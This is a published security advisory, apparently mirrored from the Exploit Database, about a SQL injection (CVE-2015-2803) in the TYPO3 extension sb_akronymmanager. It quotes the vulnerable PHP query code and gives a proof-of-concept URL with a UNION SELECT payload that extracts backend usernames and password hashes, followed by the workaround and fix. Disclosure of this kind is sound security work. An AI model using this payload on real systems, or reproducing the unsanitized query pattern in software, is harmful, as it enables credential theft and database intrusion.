## SQL Injection in TYPO3 Extension Akronymmanager

An SQL injection vulnerability in the TYPO3 extension “Akronymmanager”
allows authenticated attackers to inject SQL statements and thereby read
data from the TYPO3 database.

### Details

* Product: sb\_akronymmanager
* Affected Versions: <=0.5.0
* Fixed Versions: 7.0.0
* Vulnerability Type: SQL Injection
* Security Risk: medium
* Vendor URL: `http://typo3.org/extensions/repository/view/sb_akronymmanager`
* Vendor Status: fixed version released
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2015-002`
* Advisory Status: published
* CVE: CVE-2015-2803
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2803`

### Introduction

“The Acronym Manager adds special explanatory markup to acronyms, abbreviations
and foreign words on the whole site following the requirement to accessible web
content.

It provides a backend module to administer a list of words to generate new HTML
elements for explanatory markup.”

(from the extension’s documentation)

### More Details

Users with the respective privileges can maintain acronyms through the
Akronymmanager extension pages in the TYPO3 backend web interface.

In the extension’s file `mod1/index.php`, an SQL query is generated like
follows (line 357 and following):

```
[...]
$pageID = t3lib_div::_GET("id");
if ($pageID) $where = "uid='$pageID' AND ";
$result = $GLOBALS['TYPO3_DB']->exec_SELECTquery('title,uid', 'pages',
    $where.'hidden="0" AND deleted="0"','sorting');
[...]

```

The value of the user-supplied HTTP GET parameter ‘id’ is used without
sanitizing it before its use in the subsequent SQL statement. Therefore,
attackers are able to manipulate the resulting SQL statement and inject
their own queries into the statement.

### Proof of Concept

When requesting the following URL, the vulnerability is exploited to yield all
usernames and hashes from the TYPO3 be\_users database:

```
http://www.example.org/typo3conf/ext/sb_akronymmanager/mod1/index.php?
id=379%27%20UNION%20SELECT%20(SELECT%20group_concat(username,%27:%27,password)
%20FROM%20be_users),2%20--%20

```

The login credentials are then embedded in the HTML page that is
returned:

```
[...]
  <!-- Section header -->
  <h2>user1:$hash,user2:$hash[...]</h2>
[...]

```
### Workaround

Only give trusted users access to the Akronymmanager extension in the
TYPO3 backend.

### Fix

Upgrade the extension to version 7.0.0.

### Security Risk

An attacker who has access to the backend part of the Akronymmanager
extension may send SQL queries to the database. This can be used to read
arbitrary tables of the TYPO3 database and may ultimately result in a
privilege escalation if the TYPO3 users’ password hashes can be cracked
efficiently. Depending on the database configuration, it might also be
possible to execute arbitrary commands on the database host. As the
attack requires an attacker who already has backend access, the
vulnerability is estimated to pose only a medium risk.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# [RT-SA-2015-002] SQL Injection in TYPO3 Extension Akronymmanager

---

*From*: RedTeam Pentesting GmbH <release () redteam-pentesting de>

*Date*: Mon, 15 Jun 2015 11:02:14 +0200

```
Advisory: SQL Injection in TYPO3 Extension Akronymmanager

An SQL injection vulnerability in the TYPO3 extension "Akronymmanager"
allows authenticated attackers to inject SQL statements and thereby read
data from the TYPO3 database.

Details
=======

Product: sb_akronymmanager
Affected Versions: <=0.5.0
Fixed Versions: 7.0.0
Vulnerability Type: SQL Injection
Security Risk: medium
Vendor URL: <http://typo3.org/extensions/repository/view/sb_akronymmanager>
Vendor Status: fixed version released
Advisory URL: <https://www.redteam-pentesting.de/advisories/rt-sa-2015-002>
Advisory Status: published
CVE: CVE-2015-2803
CVE URL: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2803>

Introduction
============

"The Acronym Manager adds special explanatory markup to acronyms, abbreviations
and foreign words on the whole site following the requirement to accessible web
content.

It provides a backend module to administer a list of words to generate new HTML
elements for explanatory markup."

(from the extension's documentation)

More Details
============

Users with the respective privileges can maintain acronyms through the
Akronymmanager extension pages in the TYPO3 backend web interface.

In the extension's file mod1/index.php, an SQL query is generated like
follows (line 357 and following):

[...]
$pageID = t3lib_div::_GET("id");
if ($pageID) $where = "uid='$pageID' AND ";
$result = $GLOBALS['TYPO3_DB']->exec_SELECTquery('title,uid', 'pages',
    $where.'hidden="0" AND deleted="0"','sorting');
[...]

The value of the user-supplied HTTP GET parameter 'id' is used without
sanitizing it before its use in the subsequent SQL statement. Therefore,
attackers are able to manipulate the resulting SQL statement and inject
their own queries into the statement.

Proof of Concept
================

When requesting the following URL, the vulnerability is exploited to yield all
usernames and hashes from the TYPO3 be_users database:

------------------------------------------------------------------------
<http://www.example.org/typo3conf/ext/sb_akronymmanager/mod1/index.php>?
id=379%27%20UNION%20SELECT%20(SELECT%20group_concat(username,%27:%27,password)
%20FROM%20be_users),2%20--%20
------------------------------------------------------------------------

The login credentials are then embedded in the HTML page that is
returned:

[...]
  <!-- Section header -->
  <h2>user1:$hash,user2:$hash[...]</h2>
[...]

Workaround
==========

Only give trusted users access to the Akronymmanager extension in the
TYPO3 backend.

Fix
===

Upgrade the extension to version 7.0.0.

Security Risk
=============

An attacker who has access to the backend part of the Akronymmanager
extension may send SQL queries to the database. This can be used to read
arbitrary tables of the TYPO3 database and may ultimately result in a
privilege escalation if the TYPO3 users' password hashes can be cracked
efficiently. Depending on the database configuration, it might also be
possible to execute arbitrary commands on the database host.  As the
attack requires an attacker who already has backend access, the
vulnerability is estimated to pose only a medium risk.
